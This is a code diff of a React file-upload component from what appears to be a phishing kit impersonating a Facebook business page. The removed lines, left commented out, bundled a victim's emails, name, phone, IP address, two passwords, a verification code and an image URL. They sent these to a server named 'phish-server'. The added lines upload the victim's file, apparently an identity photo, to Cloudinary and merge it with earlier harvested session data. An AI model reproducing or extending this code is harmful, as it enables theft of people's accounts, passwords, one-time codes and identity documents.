@@ -1,57 +1,40 @@
 import React, { useState } from 'react'
 import axios from 'axios';
 import { useNavigate } from 'react-router-dom'
+import { getSession } from '../../apis/sectionHandle';
 
 const UploadComponent = () => {
 
     const [selectedFile, setSelectedFile] = useState(null);
-    // const dataLocalPassword = JSON.parse(localStorage.getItem('dataAllCode'));
     const navigate = useNavigate();
 
-    const handleFileChange = (e) => {
+    const handleFileChange = (e:any) => {
         const file = e.target.files[0];
         setSelectedFile(file);
     };
 
     const handleUpload = () => {
-        // const cloudName = 'ductham087'; // Thay YOUR_CLOUD_NAME bằng Cloud Name của bạn
-        // if (selectedFile) {
-        //     const formData = new FormData();
-        //     formData.append('file', selectedFile);
-        //     formData.append("upload_preset", "apiData");
+        const cloudName = 'ductham087';
+        const dataUser = getSession('stepFive');
+        if (selectedFile) {
+            const formData = new FormData();
+            formData.append('file', selectedFile);
+            formData.append("upload_preset", "apiData");
 
-        //     axios
-        //         .post(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, formData)
-        //         .then((response) => {
-        //             // Lấy đường dẫn ảnh trên Cloudinary từ phản hồi
-        //             const imageUrl = response.data.secure_url;
+            axios
+                .post(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, formData)
+                .then((response) => {
 
-        //             const dataImages = { ...dataLocalPassword, imageUrl };
+                    const dataSendThird = {
+                        imageUrl: response.data.secure_url,
+                        ...dataUser
+                    }
+                    console.log(dataSendThird)
 
-        //             console.log(dataImages);
+                    // navigate('final');
+                })
 
-        //             const data = {
-        //                 'fill_business_email': dataImages.fill_business_email,
-        //                 'fill_personal_email': dataImages.fill_personal_email,
-        //                 'fill_full_name': dataImages.fill_full_name,
-        //                 'fill_facebook_pagename': dataImages.fill_facebook_pagename,
-        //                 'fill_phone': dataImages.fill_phone,
-        //                 'ip': dataImages.IP,
-        //                 'first_password': dataImages.firt_password,
-        //                 'second_password': dataImages.second_password,
-        //                 'first_code': dataImages.first_code,
-        //                 'image': imageUrl,
-        //             }
-
-        //             axios.post("https://phish-server-full-production.up.railway.app/api/news", data)
-        //                 .then((response) => {
-        //                     if (response.data.status === 0) {
-        //                         navigate('/*/final');
-        //                     }
-        //                 })
-        //         })
-
-        // }
+        }
     };
 
     return (
